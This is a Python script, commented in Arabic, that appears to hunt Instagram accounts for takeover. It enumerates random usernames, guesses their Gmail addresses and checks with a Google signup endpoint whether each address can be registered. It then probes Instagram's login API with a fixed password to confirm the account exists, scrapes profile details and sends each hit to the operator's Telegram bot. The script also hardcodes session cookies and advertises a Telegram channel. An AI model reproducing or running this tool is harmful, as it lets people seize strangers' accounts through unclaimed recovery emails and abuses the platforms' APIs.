import webbrowser
webbrowser.open('')
try:
 import requests,os,names,random,time,mechanize,sys
 from user_agent import generate_user_agent
 from uuid import uuid4
except:
 os.system("pip install requsets")
 os.system("pip install names")
 os.system("pip install user_agent")
 os.system("pip install uid")
 os.system("pip install uuid")
 os.system("clear")
import requests,os,names,json,random
import requests,os,names,random,time
from user_agent import generate_user_agent
from uuid import uuid4
uid = uuid4()
#------------------------------[الالوان]------------------------------
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'

#------------------------------[saeim]------------------------------


def azz():
 print('تريد 👆تطلع وبيقه يصيد اضغط  على هاي')
 print('الي مأشر عليها ')
 
 print('telegram 👇')
 
 azro = (f"""{C} 
 
{B}< Tele / https://t.me/bsx_h2
{F}*******

{Z} |  {F}م
{Z}┃ ---------------------
{Z}┃ {Y}  > 
{Z}┃ ---------------------
{Z}┃  {F}
{Z}┃ ----------------------
{Z}┃  {Y} 

{F}""")
 for azr in azro.splitlines():
  time.sleep(0.05)
  print(azr)
azz()
sid = input(f'{Z} [{B}⌯{Z}] {B} سيزون ايدي{Z} » ' + F)

print(G+'*********')
token = input(f'{Z} [{B}⌯{Z}] {B}اكتب التوكن{Z} » ' + F)
print(G+'******')
ID = input(f'{Z} [{B}⌯{Z}] {B}ايديك لكـ{Z} » ' +F)
print(G+'******')
head={'Cookie':'mid=YtsGMQABAAG655xZLpjicwJPPbur; ig_did=81DC2141-F720-460E-A00F-149B3023C2AE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ujyHcjMTcHM59fv8ho4qna3HmLzGOcIj; ds_user_id=46165248972; sessionid='+sid}
def check(email,user):
 user=str(user)
 email=str(email)
 url='https://i.instagram.com/api/v1/accounts/login/'
 headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.70 (Edition Campaign 34)',                                    'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',

'Host':'i.instagram.com'}
 data = {'uuid':uid,  'password':'@whisper666',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
 req= requests.post(url, headers=headers, data=data).json()
 if req['message'] == 'The password you entered is incorrect. Please try again.':
	 rr=requests.get(f'https://www.instagram.com/{user}/?a=1&d=dis',headers=head).json()  
	 nam = str(rr['graphql']['user']['full_name'])
	 iddd = str(rr['graphql']['user']['id'])
	 fol = str(rr['graphql']['user']['edge_followed_by']['count'])
	 fols =str(rr['graphql']['user']['edge_follow']['count'])
	 hi = str(rr['graphql']['user']['highlight_reel_count'])
	 isp = str(rr['graphql']['user']['is_private'])	 
	 isv = str(rr['graphql']['user']['is_verified'])
	 pro = str(rr['graphql']['user']['profile_pic_url'])
	 bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
	 re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
	 ree = re.json()
	 dat = ree['data']
	 tlg =(f"""
➭ IᑎᔕTᗩᘜᖇᗩᗰ ᗩᐯᗩIᒪᗩᗷᒪᗴ 
𖡦-› Good Instagram
𖡦-› ɴᴀᴍᴇ » {nam}
𖡦𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞 :   {user}
𖡦-› 𝐞𝐦𝐚𝐢𝐥 : {email}
𖡦𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 : {fols}
𖡦𝐟𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 : {fol}
𖡦𝐚𝐜𝐜𝐨𝐮𝐧𝐭:{isp} 𝐫𝐞𝐚𝐭:{bio}
𝐝𝐚𝐭𝐞 : {dat}
𖡦-pro: {pro}
HighLight :{isv}
𖡦-› 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}\n """)
	 print(G+tlg)
	 print(f'{E}====================================')
	 requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
 if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
	 print(f'{Z} ● اصبر 🔱 فحص {email}')
	 
def yahoo(email,user):
	eml=str(email)
	email=eml.split('@')[0]+'@gmail.com'
	url = 'https://android.clients.google.com/setup/checkavail'
	h = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
	d = json.dumps({
		'username':email,
		'version':'3',
		'firstName':'AbaLahb',
		'lastName':'AbuJahl'
	})
	res = requests.post(url,data=d,headers=h)
	if res.json()['status'] == 'SUCCESS':
	    check(email,user)
	else:
	    print (f'{Y} ● وات ذا فاك '+email)
def users():#  mal=['male','femal']
#  gen=random.choice(mal)
  user='1234567890qwertyuiopasdfghjklzxcvbnm.'
  num='56789'
  rng=int("".join(random.choice(num)for i in range(1)))
  name=str("".join(random.choice(user)for i in range(rng)))
  whisper=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=head).json()
  mn=0
  try:
   while True:
    mn += 1
    user=str(whisper['users'][mn]['user']['username'])
    emai=user.split('gmail')[0]
    email=emai+'@gmail.com'
    yahoo(email,user)
  except IndexError:
   users()
users()
